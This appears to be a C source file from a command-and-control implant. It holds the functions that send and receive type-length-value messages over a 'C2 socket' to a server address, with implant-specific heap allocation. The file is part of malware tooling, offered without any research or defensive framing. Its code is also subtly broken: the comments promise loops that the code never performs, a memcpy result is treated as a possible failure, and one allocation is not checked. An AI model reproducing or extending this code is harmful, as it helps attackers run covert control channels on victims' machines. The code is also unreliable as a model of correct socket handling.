#include "protocol.h"

#define SOCKET_SEND_FLAGS 0
#define SOCKET_RECV_FLAGS 0
#define TLV_TYPE_FIELD_OFFSET 0U
#define TLV_LENGTH_FIELD_OFFSET sizeof(DWORD)

/**
 * @brief Sends exactly len bytes on the active socket.
 *
 * This helper loops until the full buffer has been transmitted or a socket
 * error occurs.
 *
 * @param sock The active C2 socket used to send data.
 * @param buf The byte buffer to send.
 * @param len The number of bytes to send.
 *
 * @return TRUE on success, or FALSE if send fails.
 */
static BOOL SendAll(SOCKET sock, CONST CHAR* buf, INT len)
{
	struct sockaddr_in sa = GetSockAddr();

	ASSERT(sock != INVALID_SOCKET);
	ASSERT(buf != NULL);

	INT sent = sendto(
		sock,
		buf,
		len,
		SOCKET_SEND_FLAGS,
		(struct sockaddr*)&sa,
		sizeof(struct sockaddr)
	);
	if (sent == SOCKET_ERROR)
	{
		return FALSE;
	}

	return TRUE;
}

/**
 * @brief Receives exactly len bytes from the active socket.
 *
 * This helper loops until the full buffer has been read or a socket error
 * occurs.
 *
 * @param sock The active C2 socket used to receive data.
 * @param buf The output buffer to fill.
 * @param len The number of bytes to receive.
 *
 * @return TRUE on success, or FALSE if recv fails or the peer disconnects.
 */
static BOOL RecvAll(SOCKET sock, CHAR* buf, INT len)
{

	ASSERT(sock != INVALID_SOCKET);
	ASSERT(buf != NULL);

	INT received = recvfrom(
		sock,
		buf,
		len,
		SOCKET_RECV_FLAGS,
		NULL,
		NULL
	);
	if (received <= 0)
	{
		return FALSE;
	}

	return TRUE;
}

BOOL SendTlvMessage(SOCKET sock, DWORD type, DWORD payloadLength, CONST PBYTE payload)
{
	PBYTE msg = ImplantHeapAlloc(TLV_HEADER_SIZE + payloadLength);

	ASSERT(sock != INVALID_SOCKET);

	memcpy(msg + TLV_TYPE_FIELD_OFFSET, &type, sizeof(DWORD));
	memcpy(msg + TLV_LENGTH_FIELD_OFFSET, &payloadLength, sizeof(DWORD));
	memcpy(msg + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD), payload, payloadLength);

	if (!SendAll(sock, (CONST CHAR*)msg, TLV_HEADER_SIZE + payloadLength))
	{
		ImplantHeapFree(msg);
		return FALSE;
	}

	ImplantHeapFree(msg);
	return TRUE;
}

BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
{
	PBYTE buff = ImplantHeapAlloc(MAX_MESSAGE_SIZE);
	ASSERT(sock != INVALID_SOCKET);
	ASSERT(msg != NULL);

	msg->type = 0;
	msg->length = 0;
	msg->value = NULL;

	if (!RecvAll(sock, (CHAR*)buff, MAX_MESSAGE_SIZE))
	{
		ImplantHeapFree(buff);
		return FALSE;
	}

	msg->type = *(DWORD*)(buff + TLV_TYPE_FIELD_OFFSET);
	msg->length = *(DWORD*)(buff + TLV_LENGTH_FIELD_OFFSET);

	if (msg->length >= MAX_MESSAGE_SIZE)
	{
		ImplantHeapFree(buff);
		return FALSE;
	}

	if (msg->length > 0)
	{
		msg->value = (PBYTE)ImplantHeapAlloc((SIZE_T)msg->length);
		if (msg->value == NULL)
		{
			ImplantHeapFree(buff);
			return FALSE;
		}

		if (!memcpy(msg->value,
			buff + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD),
			msg->length
			))
		{
			ImplantHeapFree(msg->value);
			ImplantHeapFree(buff);
			msg->value = NULL;
			return FALSE;
		}
	}

	ImplantHeapFree(buff);

	return TRUE;
}

VOID FreeTlvMessage(TLV_MESSAGE* msg)
{
	ASSERT(msg != NULL);

	if (msg->value != NULL)
	{
		ImplantHeapFree(msg->value);
		msg->value = NULL;
	}
}
